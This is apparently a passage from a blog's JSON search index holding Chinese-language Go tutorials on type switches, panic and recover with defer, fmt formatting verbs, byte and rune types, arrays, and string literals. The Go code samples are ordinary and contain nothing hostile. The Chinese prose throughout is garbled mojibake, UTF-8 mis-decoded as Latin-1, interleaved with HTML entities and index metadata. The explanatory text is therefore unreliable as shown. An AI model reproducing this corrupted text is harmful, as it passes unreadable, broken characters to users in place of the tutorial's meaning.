maximum default: return value&#125; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œswitch åé¢æ²¡æœ‰é»˜è®¤çš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªæ—¶å€™ Go è¯­è¨€é»˜è®¤å…¶å€¼ä¸º Trueã€‚ åœ¨å‰é¢æˆ‘ä»¬æåˆ°è¿‡ç±»å‹æ–­è¨€ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“å˜é‡çš„ç±»å‹å°±å¯ä»¥ä½¿ç”¨ç±»å‹æ–­è¨€ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çŸ¥é“ç±»å‹å¯èƒ½æ˜¯è®¸å¤šç±»å‹ä¸­çš„ä¸€ç§æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç±»å‹å¼€å…³ã€‚å…¶è¯­æ³•å¦‚ä¸‹ï¼š 123456switch optionalStatement; typeSwitchGuard &#123; case type1: block1 ... case typeN: blockN default: blockD&#125; è¯´äº†è¿™ä¹ˆå¤šï¼Œè®©æˆ‘ä»¬è¿›è¡Œä¸‹ç»ƒä¹ ï¼Œåˆ›å»ºæºæ–‡ä»¶ switch_t.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot;)func classchecker(items ...interface&#123;&#125;) &#123; // åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ¥å—ä»»æ„å¤šçš„ä»»æ„ç±»å‹çš„å‚æ•° for i, x := range items &#123; switch x := x.(type) &#123; // åˆ›å»ºäº†å½±å­å˜é‡ case bool: fmt.Printf(&quot;param #%d is a bool, value: %t\\n&quot;, i, x) case float64: fmt.Printf(&quot;param #%d is a float64, value: %f\\n&quot;, i, x) case int, int8, int16, int32, int64: fmt.Printf(&quot;param #%d is a int, value: %d\\n&quot;, i, x) case uint, uint8, uint16, uint32, uint64: fmt.Printf(&quot;param #%d is a uint, value: %d\\n&quot;, i, x) case nil: fmt.Printf(&quot;param #%d is a nil\\n&quot;, i) case string: fmt.Printf(&quot;param #%d is a string, value: %s\\n&quot;, i, x) default: fmt.Printf(&quot;param #%d&#x27;s type is unknow\\n&quot;, i) &#125; &#125;&#125;func main() &#123; classchecker(5, -17.98, &quot;AIDEN&quot;, nil, true, complex(1, 1))&#125; ä»¥ä¸Šä»£ç ä¸­æˆ‘ä»¬é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªæ¥æ”¶ä»»æ„æ•°é‡ä»»æ„ç±»å‹å‚æ•°çš„å‡½æ•°ï¼Œç„¶åä½¿ç”¨ for ... range aSlice çš„è¯­æ³•è¿­ä»£äº†æ¯ä¸€ä¸ªåœ¨åˆ‡ç‰‡ items ä¸­çš„å…ƒç´ ï¼Œæ¥ç€ä½¿ç”¨äº† switch ç±»å‹å¼€å…³åˆ¤æ–­äº†æ¯ä¸€ä¸ªå‚æ•°çš„ç±»å‹ï¼Œå¹¶æ‰“å°äº†å…¶å€¼å’Œç±»å‹ã€‚ç¨‹åºè¿è¡Œè¾“å‡ºå¦‚ä¸‹ï¼š 1234567$ go run switch_t.goparam #0 is a int, value: 5param #1 is a float64, value: -17.980000param #2 is a string, value: AIDENparam #3 is a nilparam #4 is a bool, value: trueparam #5&#x27;s type is unknow","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"switchè¯­å¥","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/switchè¯­å¥","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/switch%E8%AF%AD%E5%8F%A5/"}]},{"title":"Goé¡ºåºç¼–ç¨‹â€”â€”Goè¯­è¨€é¡ºåºç¼–ç¨‹","date":"2023-10-27T01:24:02.140Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹/","text":"çŸ¥è¯†ç‚¹ æµç¨‹æ§åˆ¶ å‡½æ•° ç±»å‹è½¬æ¢ ç±»å‹æ–­è¨€ error defer å’Œ panic æ–‡ç« åˆ—è¡¨ ã€Goç®€æ˜æ‰‹å†Œã€‘é”™è¯¯å¤„ç† ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹â€“å‡½æ•°çš„å¤šè¿”å›å€¼ ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹â€“ç±»å‹è½¬æ¢ ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹â€“æµç¨‹æ§åˆ¶ ã€Goç®€æ˜æ‰‹å†Œã€‘panicå’Œdefer ã€Goé¡ºåºç¼–ç¨‹ã€‘README ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¡ºåºç¼–ç¨‹â€“æµç¨‹æ§åˆ¶","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Gp","slug":"æ‰‹å†Œ-Gp","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Gp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘panicå’Œdefer","date":"2023-10-27T01:24:02.137Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/panicå’Œdefer/ã€Goç®€æ˜æ‰‹å†Œã€‘panicå’Œdefer/","text":"panic å’Œ recover panic() å‡½æ•°ç”¨äºæŠ›å‡ºå¼‚å¸¸ï¼Œrecover() å‡½æ•°ç”¨äºæ•è·å¼‚å¸¸ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š 12func panic(interface&#123;&#125;)func recover() interface&#123;&#125; å½“åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è°ƒç”¨ panic() æ—¶ï¼Œæ­£å¸¸çš„å‡½æ•°æ‰§è¡Œæµç¨‹å°†ç«‹å³ç»ˆæ­¢ï¼Œä½†å‡½æ•°ä¸­ä¹‹å‰ä½¿ç”¨ defer å…³é”®å­—å»¶è¿Ÿæ‰§è¡Œçš„è¯­å¥å°†æ­£å¸¸å±•å¼€æ‰§è¡Œï¼Œä¹‹åè¯¥å‡½æ•°å°†è¿”å›åˆ°è°ƒç”¨å‡½æ•°ï¼Œå¹¶å¯¼è‡´é€å±‚å‘ä¸Šæ‰§è¡Œ panic() æµç¨‹ï¼Œç›´è‡³æ‰€å±çš„ goroutine ä¸­æ‰€æœ‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°è¢«ç»ˆæ­¢ã€‚é”™è¯¯ä¿¡æ¯å°†è¢«æŠ¥å‘Šï¼ŒåŒ…æ‹¬åœ¨è°ƒç”¨ panic() å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºé”™è¯¯æµç¨‹å¤„ç†ã€‚ panic() æ¥å—ä¸€ä¸ª interface&#123;&#125; å‚æ•°ï¼Œå¯æ”¯æŒä»»æ„ç±»å‹ï¼Œä¾‹å¦‚ï¼š 123panic(404)panic(&quot;network broken&quot;)panic(Error(&quot;file not exists&quot;)) åœ¨ defer è¯­å¥ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ recover() ç»ˆæ­¢é”™è¯¯å¤„ç†æµç¨‹ï¼Œè¿™æ ·å¯ä»¥é¿å…å¼‚å¸¸å‘ä¸Šä¼ é€’ï¼Œä½†è¦æ³¨æ„ recover() ä¹‹åï¼Œç¨‹åºä¸ä¼šå†å›åˆ° panic() é‚£é‡Œï¼Œå‡½æ•°ä»åœ¨ defer ä¹‹åè¿”å›ã€‚æ–°å»ºä¸€ä¸ªæºæ–‡ä»¶ error1.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819func foo() &#123; panic(errors.New(&quot;i&#x27;m a bug&quot;)) return&#125;func test() (result int) &#123; defer func() &#123; if r := recover(); r != nil &#123; err := r.(error) fmt.Println(&quot;Cache Exception:&quot;, err) &#125; &#125;() foo() return 10&#125;func main() &#123; fmt.Println(test()) // 0&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€é¡ºåºç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/"},{"name":"panicå’Œdefer","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€é¡ºåºç¼–ç¨‹/panicå’Œdefer","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E9%A1%BA%E5%BA%8F%E7%BC%96%E7%A8%8B/panic%E5%92%8Cdefer/"}]},{"title":"ã€Go ç®€æ˜æ‰‹å†Œã€‘GoåŸºæœ¬è¯­æ³•â€”â€”æ ¼å¼åŒ–å­—ç¬¦ä¸²","date":"2023-10-27T01:24:02.135Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/æ ¼å¼åŒ–å­—ç¬¦ä¸²/ã€Goç®€æ˜æ‰‹å†Œã€‘æ ¼å¼åŒ–å­—ç¬¦ä¸²/","text":"Go è¯­è¨€æ ‡å‡†åº“ä¸­çš„ fmt åŒ…æä¾›äº†æ‰“å°å‡½æ•°å°†æ•°æ®ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œæ–‡ä»¶ï¼Œå…¶ä»–æ»¡è¶³ io.Writer æ¥å£çš„å€¼ä»¥åŠå…¶ä»–å­—ç¬¦ä¸²ã€‚ç›®å‰ä¸ºæ­¢æˆ‘ä»¬ä½¿ç”¨äº† fmt.Printf å’Œ fmt.Printlnï¼Œå¯¹äºå‰è€…çš„ä½¿ç”¨ï¼Œå°±åƒ C è¯­è¨€ä¸­çš„ printf å‡½æ•°ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æä¾›ä¸€äº›æ ¼å¼åŒ–æŒ‡ä»¤ï¼Œè®© Go è¯­è¨€å¯¹è¾“å‡ºçš„å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼åŒ–ã€‚åŒæ ·çš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›æ ¼å¼åŒ–ä¿®é¥°ç¬¦ï¼Œæ”¹å˜æ ¼å¼åŒ–æŒ‡ä»¤çš„è¾“å‡ºç»“æœï¼Œ å¦‚å·¦å¯¹é½ç­‰ã€‚å¸¸ç”¨çš„æ ¼å¼åŒ–æŒ‡ä»¤å¦‚ä¸‹ï¼š æ ¼å¼åŒ–æŒ‡ä»¤ å«ä¹‰ %% % å­—é¢é‡ %b ä¸€ä¸ªäºŒè¿›åˆ¶æ•´æ•°ï¼Œå°†ä¸€ä¸ªæ•´æ•°æ ¼å¼åŒ–ä¸ºäºŒè¿›åˆ¶çš„è¡¨è¾¾æ–¹å¼ %c ä¸€ä¸ª Unicode çš„å­—ç¬¦ %d åè¿›åˆ¶æ•°å€¼ %o å…«è¿›åˆ¶æ•°å€¼ %x å°å†™çš„åå…­è¿›åˆ¶æ•°å€¼ %X å¤§å†™çš„åå…­è¿›åˆ¶æ•°å€¼ %U ä¸€ä¸ª Unicode è¡¨ç¤ºæ³•è¡¨ç¤ºçš„æ•´å½¢ç å€¼ï¼Œé»˜è®¤æ˜¯ 4 ä¸ªæ•°å­—å­—ç¬¦ %s è¾“å‡ºä»¥åŸç”Ÿçš„ UTF-8 å­—èŠ‚è¡¨ç¤ºçš„å­—ç¬¦ï¼Œå¦‚æœ console ä¸æ”¯æŒ UTF-8 ç¼–ç ï¼Œåˆ™ä¼šè¾“å‡ºä¹±ç  %t ä»¥ true æˆ–è€… false çš„æ–¹å¼è¾“å‡ºå¸ƒå°”å€¼ %v ä½¿ç”¨é»˜è®¤æ ¼å¼è¾“å‡ºå€¼ï¼Œæˆ–è€…ä½¿ç”¨ç±»å‹çš„ String() æ–¹æ³•è¾“å‡ºçš„è‡ªå®šä¹‰å€¼ï¼Œå¦‚æœè¯¥æ–¹æ³•å­˜åœ¨çš„è¯ %T è¾“å‡ºå€¼çš„ç±»å‹ å¸¸ç”¨çš„æ ¼å¼åŒ–æŒ‡ä»¤ä¿®é¥°ç¬¦å¦‚ä¸‹ï¼š ç©ºç™½ å¦‚æœè¾“å‡ºçš„æ•°å­—ä¸ºè´Ÿï¼Œåˆ™åœ¨å…¶å‰é¢åŠ ä¸Šä¸€ä¸ªå‡å· -ã€‚å¦‚æœè¾“å‡ºçš„æ˜¯æ•´æ•°ï¼Œåˆ™åœ¨å‰é¢åŠ ä¸€ä¸ªç©ºæ ¼ã€‚ä½¿ç”¨ %x æˆ–è€… %X æ ¼å¼åŒ–æŒ‡ä»¤è¾“å‡ºæ—¶ï¼Œä¼šåœ¨ç»“æœä¹‹é—´æ·»åŠ ä¸€ä¸ªç©ºæ ¼ã€‚ä¾‹å¦‚ fmt.Printf(&quot;% X&quot;, &quot;å®&quot;) è¾“å‡º E5 AE 9Eã€‚ # 1234567891011121314151617181920212223242526272829303132333435363738 - `%#o` è¾“å‡ºä»¥ `0` å¼€å§‹çš„å…«è¿›åˆ¶æ•°æ®ã€‚ - `%#x` è¾“å‡ºä»¥ `0x` å¼€å§‹çš„åå…­è¿›åˆ¶æ•°æ®ã€‚- `+` è®©æ ¼å¼åŒ–æŒ‡ä»¤åœ¨æ•°å€¼å‰é¢è¾“å‡º `+` å·æˆ–è€… `-` å·ï¼Œä¸ºå­—ç¬¦ä¸²è¾“å‡º ASCII å­—ç¬¦ï¼ˆé ASCII å­—ç¬¦ä¼šè¢«è½¬ä¹‰ï¼‰ï¼Œä¸ºç»“æ„ä½“è¾“å‡ºå…¶å­—æ®µåã€‚- `-` è®©æ ¼å¼åŒ–æŒ‡ä»¤å°†å€¼å‘å·¦å¯¹é½ï¼ˆé»˜è®¤å€¼ä¸ºåƒå³å¯¹é½ï¼‰ã€‚- `0` è®©æ ¼å¼æŒ‡ä»¤ä»¥æ•°å­— 0 è€Œéç©ºç™½è¿›è¡Œå¡«å……ã€‚è®©æˆ‘ä»¬ç»ƒä¹ ä¸€ä¸‹ï¼Œåˆ›å»ºæºæ–‡ä»¶ `fmt_t.go`ï¼Œè¾“å…¥ä»¥ä¸‹æºç ï¼š```gopackage mainimport ( &quot;fmt&quot;)func main() &#123; text := &quot;\\u5B9E\\u9A8C\\u697C&quot; fmt.Printf(&quot;bool output:\\n%t\\n%t\\n\\n&quot;, true, false) fmt.Println(&quot;number output, origin value: 64&quot;) fmt.Printf(&quot;|%b|%8b|%-8b|%08b|% 8b|\\n&quot;, 64, 64, 64, 64, 64) fmt.Printf(&quot;|%x|%8x|%-8x|%08X|% 8X|\\n\\n&quot;, 64, 64, 64, 64, 64) fmt.Println(`text output, origin value: \\u5B9E\\u9A8C\\u697C`) fmt.Printf(&quot;content: %s\\n&quot;, text) fmt.Printf(&quot;hex value: % X\\nUnicode value: &quot;, text) for _, char := range text &#123; fmt.Printf(&quot;%U &quot;, char) &#125; fmt.Println() bytes := []byte(text) fmt.Printf(&quot;value of bytes: %s\\n&quot;, bytes) fmt.Printf(&quot;hex value of bytes: % X\\n&quot;, bytes) fmt.Printf(&quot;origin value of bytes: %v\\n&quot;, bytes)&#125; è¿è¡Œä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12345678910111213141516$ go run fmt_t.gobool output:truefalsenumber output, origin value: 64|1000000| 1000000|1000000 |01000000| 1000000||40| 40|40 |00000040| 40|text output, origin value: \\u5B9E\\u9A8C\\u697Ccontent: å®éªŒæ¥¼hex value: E5 AE 9E E9 AA 8C E6 A5 BCUnicode value: U+5B9E U+9A8C U+697Cvalue of bytes: å®éªŒæ¥¼hex value of bytes: E5 AE 9E E9 AA 8C E6 A5 BCorigin value of bytes: [229 174 158 233 170 140 230 165 188] ä»£ç ä¸€ç›®äº†ç„¶ï¼Œå°±ä¸è¯¦ç»†è§£é‡Šäº†ã€‚","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€åŸºç¡€","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘GoåŸºæœ¬è¯­æ³•--å­—ç¬¦ç±»å‹","date":"2023-10-27T01:24:02.132Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/å­—ç¬¦ç±»å‹/ã€Goç®€æ˜æ‰‹å†Œã€‘å­—ç¬¦ç±»å‹/","text":"åœ¨ Go è¯­è¨€ä¸­æ”¯æŒä¸¤ä¸ªå­—ç¬¦ç±»å‹ï¼Œä¸€ä¸ªæ˜¯ Byteï¼ˆå®é™…ä¸Šæ˜¯ Unit8 çš„åˆ«åï¼‰ï¼Œä»£è¡¨ UTF-8 å­—ç¬¦ä¸²çš„å•ä¸ªå­—èŠ‚çš„å€¼ï¼›å¦ä¸€ä¸ªæ˜¯ runeï¼Œä»£è¡¨å•ä¸ª Unicode å­—ç¬¦ã€‚ å¤„äºç®€åŒ–è¯­è¨€çš„è€ƒè™‘ï¼ŒGo è¯­è¨€çš„å¤šæ•° API éƒ½å‡è®¾å­—ç¬¦ä¸²ä¸º UTF-8 ç¼–ç ã€‚å°½ç®¡ Unicode å­—ç¬¦åœ¨æ ‡å‡†åº“ä¸­æœ‰æ”¯æŒï¼Œä½†å®é™…å¾ˆå°‘ä½¿ç”¨ã€‚ æ•°ç»„ Go è¯­è¨€çš„æ•°ç»„æ˜¯ä¸€ä¸ªå®šé•¿çš„åºåˆ—ï¼Œå…¶ä¸­çš„å…ƒç´ ç±»å‹ç›¸åŒã€‚å¤šç»´æ•°ç»„å¯ä»¥ç®€å•åœ°ä½¿ç”¨è‡ªèº«ä¸ºæ•°ç»„çš„å…ƒç´ æ¥åˆ›å»ºã€‚æ•°ç»„çš„å…ƒç´ ä½¿ç”¨æ“ä½œç¬¦å· [ ] æ¥ç´¢å¼•ï¼Œç´¢å¼•ä» 0 å¼€å§‹ï¼Œåˆ° len(array)-1 ç»“æŸã€‚æ•°ç»„ä½¿ç”¨ä»¥ä¸‹è¯­æ³•åˆ›å»ºï¼š [length]Type [N]Type&#123;value1, value2, ..., valueN&#125; [...]Type&#123;value1, value2, ..., valueN&#125; å¦‚æœä½¿ç”¨äº† ...ï¼ˆçœç•¥ç¬¦ï¼‰æ“ä½œç¬¦ï¼ŒGo è¯­è¨€ä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨è®¡ç®—æ•°ç»„çš„é•¿åº¦ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ•°ç»„çš„é•¿åº¦éƒ½æ˜¯å›ºå®šçš„å¹¶ä¸”ä¸å¯ä¿®æ”¹ã€‚æ•°ç»„çš„é•¿åº¦å¯ä»¥ä½¿ç”¨ len() å‡½æ•°è·å¾—ã€‚ç”±äºæ•°ç»„çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œå› æ­¤æ•°ç»„çš„é•¿åº¦å’Œå®¹é‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å¯¹äºæ•°ç»„è€Œè¨€ cap() å’Œ len() å‡½æ•°è¿”å›å€¼éƒ½æ˜¯ä¸€æ ·çš„ã€‚æ•°ç»„ä¹Ÿå¯ä»¥ä½¿ç”¨å’Œåˆ‡ç‰‡ä¸€æ ·çš„è¯­æ³•è¿›è¡Œåˆ‡ç‰‡ï¼Œåªæ˜¯å…¶ç»“æœä¸ºä¸€ä¸ªåˆ‡ç‰‡ï¼Œè€Œéæ•°ç»„ã€‚åŒæ ·çš„ï¼Œæ•°ç»„ä¹Ÿå¯ä»¥ä½¿ç”¨ range è¿›è¡Œç´¢å¼•è®¿é—®ã€‚","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€åŸºç¡€","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"å­—ç¬¦ç±»å‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/å­—ç¬¦ç±»å‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E7%B1%BB%E5%9E%8B/"}]},{"title":"ã€Go ç®€æ˜æ‰‹å†Œã€‘GoåŸºæœ¬è¯­æ³•â€”â€”å­—ç¬¦ä¸²","date":"2023-10-27T01:24:02.130Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/å­—ç¬¦ä¸²/ã€Goç®€æ˜æ‰‹å†Œã€‘å­—ç¬¦ä¸²/","text":"Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²æ˜¯ UTF-8 å­—ç¬¦çš„ä¸€ä¸ªåºåˆ—ï¼ˆå½“å­—ç¬¦ä¸º ASCII ç æ—¶åˆ™å ç”¨ 1 ä¸ªå­—èŠ‚ï¼Œå…¶å®ƒå­—ç¬¦æ ¹æ®éœ€è¦å ç”¨ 2-4 ä¸ªå­—èŠ‚ï¼‰ã€‚UTF-8 æ˜¯è¢«å¹¿æ³›ä½¿ç”¨çš„ç¼–ç æ ¼å¼ï¼Œæ˜¯æ–‡æœ¬æ–‡ä»¶çš„æ ‡å‡†ç¼–ç ï¼Œå…¶å®ƒåŒ…æ‹¬ XML å’Œ JSON åœ¨å†…ï¼Œä¹Ÿéƒ½ä½¿ç”¨è¯¥ç¼–ç ã€‚ç”±äºè¯¥ç¼–ç å¯¹å ç”¨å­—èŠ‚é•¿åº¦çš„ä¸å®šæ€§ï¼ŒGo ä¸­çš„å­—ç¬¦ä¸²ä¹Ÿå¯èƒ½æ ¹æ®éœ€è¦å ç”¨ 1 è‡³ 4 ä¸ªå­—èŠ‚ï¼Œè¿™ä¸å…¶å®ƒè¯­è¨€å¦‚ C++ã€Java æˆ–è€… Python ä¸åŒã€‚Go è¿™æ ·åšçš„å¥½å¤„æ˜¯ä¸ä»…å‡å°‘äº†å†…å­˜å’Œç¡¬ç›˜ç©ºé—´å ç”¨ï¼ŒåŒæ—¶ä¹Ÿä¸ç”¨åƒå…¶å®ƒè¯­è¨€é‚£æ ·éœ€è¦å¯¹ä½¿ç”¨ UTF-8 å­—ç¬¦é›†çš„æ–‡æœ¬è¿›è¡Œç¼–ç å’Œè§£ç ã€‚ Go è¯­è¨€ä¸­å­—ç¬¦ä¸²çš„å¯ä»¥ä½¿ç”¨åŒå¼•å· (&quot;) æˆ–è€…åå¼•å· (`) æ¥åˆ›å»ºã€‚åŒå¼•å·ç”¨æ¥åˆ›å»ºå¯è§£æçš„å­—ç¬¦ä¸²å­—é¢é‡ï¼Œæ‰€è°“å¯è§£æçš„æ˜¯æŒ‡å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›ç¬¦å·å¯ä»¥è¢«æ ¼å¼åŒ–ä¸ºå…¶ä»–å†…å®¹ï¼Œå¦‚ \\n åœ¨åœ¨è¾“å‡ºæ—¶å€™ä¼šè¢«æ ¼å¼åŒ–æˆæ¢è¡Œç¬¦ï¼Œå¦‚æœéœ€è¦æŒ‰ç…§åŸå§‹å­—ç¬¦è¾“å‡ºå¿…é¡»è¿›è¡Œè½¬ä¹‰ã€‚è€Œåå¼•å·åˆ›å»ºçš„å­—ç¬¦ä¸²åŸå§‹æ˜¯ä»€ä¹ˆæ ·ï¼Œé‚£è¾“å‡ºè¿˜æ˜¯ä»€ä¹ˆï¼Œä¸éœ€è¦è¿›è¡Œä»»ä½•è½¬ä¹‰ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªä¾‹å­ï¼š 123t1 := &quot;\\&quot;hello\\&quot;&quot; //å†…å®¹ï¼š &quot;hello&quot;t2 := `&quot;hello&quot;` //å†…å®¹ï¼šå’Œt1ä¸€è‡´t3 := &quot;\\u6B22\\u8FCE&quot; 